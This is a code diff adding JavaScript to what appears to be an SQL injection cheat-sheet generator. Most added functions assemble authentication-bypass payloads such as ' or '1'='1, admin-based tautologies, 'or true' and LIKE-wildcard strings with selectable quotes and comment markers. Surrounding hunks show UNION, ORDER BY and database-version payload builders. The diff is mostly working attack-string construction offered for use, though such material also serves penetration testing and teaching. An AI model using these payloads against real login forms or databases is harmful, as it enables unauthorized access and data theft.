@@ -61,6 +61,164 @@ function SwitchColorMode() {
     }
 }
 
+function generateAlwaysTrueAuth() {
+    var queryInput = document.getElementById('Bypass-Query-1');
+    var commentChoice = document.getElementById('Always-True-Auth-Comment-Type').value;
+
+
+    // Construct the query with the selected comment, if any
+    queryInput.value = "' or '1'='1" + commentChoice;
+}
+
+
+function generateEmptyStringAuth() {
+    var queryInput = document.getElementById('Bypass-Query-2');
+    var commentChoice = document.getElementById('Bypass-Query-Comment-Type').value;
+
+    queryInput.value = "' or ''='" + commentChoice;
+}
+
+
+function generateAdminAuth() {
+    var quoteChoice = document.getElementById('AdminAuth-Quote-Choice').value;
+    var commentChoice = document.getElementById('AdminAuth-Comment-Choice').value;
+
+    // Constructing the query
+    var query = `admin${quoteChoice}or${quoteChoice}${commentChoice}`;
+
+    document.getElementById('Admin-Auth-Query').value = query;
+}
+
+function generateCommentAuth() {
+    var commentChoice = document.getElementById('Comment-Auth-Comment-Choice').value;
+
+    var query = `' or ${commentChoice} or '`;
+
+    if (commentChoice === '') {
+        query = `' or ${commentChoice}`;
+    }
+
+    document.getElementById('Comment-Auth-Query').value = query;
+}
+
+
+
+function generateCharAuth() {
+    var charValue = document.getElementById('Char-Value').value;
+    var commentType = document.getElementById('Comment-Type').value;
+
+    var query = `\' or "${charValue}" or \'${commentType}`;
+
+    document.getElementById('Char-Auth-Query').value = query;
+}
+
+
+
+function generateCharTrueAuth() {
+    var quoteChoice = document.getElementById('CharTrue-Quote-Choice').value;
+    var commentChoice = document.getElementById('CharTrue-Comment-Choice').value;
+
+    // Constructing the query with selected quote and comment types
+    var query = `' or ${quoteChoice}x${quoteChoice}=${quoteChoice}x${quoteChoice}${commentChoice}`;
+
+    document.getElementById('Char-True-Auth-Query').value = query;
+}
+
+
+
+function generateCharTrueAuth2() {
+    var character = document.getElementById('CharTrue2-Char-Choice').value;
+    var quoteChoice = document.getElementById('CharTrue2-Quote-Choice').value;
+    var commentChoice = document.getElementById('CharTrue2-Comment-Choice').value;
+
+    var query = `${quoteChoice}) or ((${quoteChoice}${character}${quoteChoice}))=((${quoteChoice}${character}${quoteChoice}`;
+
+    query += `${commentChoice}`;
+
+    document.getElementById('Char-True-Auth-2-Query').value = query;
+}
+
+
+
+function generateNumberAuth() {
+    var quoteChoice = document.getElementById('NumberAuth-Quote-Choice').value;
+    var commentChoice = document.getElementById('NumberAuth-Comment-Choice').value;
+
+    // Constructing the query
+    var query = `${quoteChoice}or 1 or ${quoteChoice}${commentChoice}`;
+    document.getElementById('Number-Auth-Query').value = query;
+}
+
+
+
+function generateTrueConditionAuth() {
+    var quoteChoice = document.getElementById('TrueCondition-Quote-Choice').value;
+    var commentChoice = document.getElementById('TrueCondition-Comment-Choice').value;
+
+    var query = `${quoteChoice} or true ${commentChoice}`;
+
+    document.getElementById('True-Condition-Auth-Query').value = query;
+}
+
+
+function generateFalseAdminAuth() {
+    var quoteChoice = document.getElementById('FalseAdminAuth-Quote-Choice').value;
+    var commentChoice = document.getElementById('FalseAdminAuth-Comment-Choice').value;
+
+    var query = `admin${quoteChoice} or ${quoteChoice}1${quoteChoice}=${quoteChoice}2${commentChoice}`;
+
+    document.getElementById('False-Admin-Auth-Query').value = query;
+}
+
+
+
+function generateAdminAuth2() {
+    var quoteChoice = document.getElementById('Quote-Choice').value;
+    var oneEqualsOneQuoteChoice = document.getElementById('OneEqualsOne-Quote-Choice').value;
+    var commentChoice = document.getElementById('Comment-Choice').value;
+
+    // Adjust the 1=1 part according to the selected quote type
+    var oneEqualsOnePart = oneEqualsOneQuoteChoice + '1=1' + oneEqualsOneQuoteChoice;
+
+    var query = `admin${quoteChoice} or ${oneEqualsOnePart}${commentChoice}`;
+
+    document.getElementById('Admin-Auth-Query-2').value = query;
+}
+
+
+
+function generateAlwaysTrueAuth2() {
+    var oneEqualsOneQuoteChoice = document.getElementById('AlwaysTrue-OneEqualsOne-Quote-Choice').value;
+    var commentChoice = document.getElementById('AlwaysTrue-Comment-Choice').value;
+
+    // Adjust the 1=1 part according to the selected quote type
+    var oneEqualsOnePart = oneEqualsOneQuoteChoice ? `${oneEqualsOneQuoteChoice}1${oneEqualsOneQuoteChoice}=${oneEqualsOneQuoteChoice}1${oneEqualsOneQuoteChoice}` : '1=1';
+
+    var query = `'or ${oneEqualsOnePart}${commentChoice}`;
+
+    document.getElementById('Always-True-Query-2').value = query;
+}
+
+
+
+function generateCustomQuery() {
+    var columnName = document.getElementById('Column-Name').value.trim();
+    var wildcardValue = document.getElementById('Wildcard-Value').value.trim();
+
+    if (columnName === '' || wildcardValue === '') {
+        alert('Please enter both the column name and wildcard value.');
+        return;
+    }
+
+    var customQuery = "' or " + columnName + " like '%" + wildcardValue + "'";
+    document.getElementById('Bypass-Query-18').value = customQuery;
+
+    // Show the explanation
+    document.querySelector('.explanation').style.display = 'block';
+}
+
+
+
 function generateUnionOrderBy() {
     var orderByNumber = document.getElementById('OrderBy-Number').value.trim();
     var commentOption = document.getElementById('comment-options-1').value;
@@ -262,6 +420,8 @@ function generateUnionDump4() {
 }
 
 
+
+
 function generateVersionQueryMySQL() {
     var totalColumns = parseInt(document.getElementById('Total-Columns-Version-MySQL').value, 10);
     var versionColumnPosition = parseInt(document.getElementById('Version-Column-Position-MySQL').value, 10);
@@ -315,7 +475,6 @@ function generateVersionOracleDB() {
     // Show the explanation
     document.querySelector('.explanation').style.display = 'block';
 }
-
 
 
 function generateVersionQueryPGSQL() {
